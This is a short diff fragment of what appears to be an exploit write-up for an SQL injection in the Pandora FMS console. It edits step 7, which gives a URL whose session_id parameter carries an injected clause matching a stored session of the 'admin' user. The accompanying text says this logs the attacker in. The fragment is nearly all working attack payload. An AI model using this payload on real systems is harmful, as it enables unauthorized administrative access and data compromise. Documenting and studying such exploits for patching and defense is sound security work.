@@ -63,7 +63,7 @@ sql-shell> SELECT * FROM tsessions_php WHERE `id_session` = ''OR `data` LIKE '%i
 
 7. Access the URL
 ````sql
-http://127.0.0.1/pandora_console/include/chart_generator.php?session_id='OR `data` LIKE '%id_usuario|s:5:"admin";%
+http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=PAYLOAD'OR `data` LIKE '%id_usuario|s:5:"admin";%
 ````
 
 and then your user will be logged
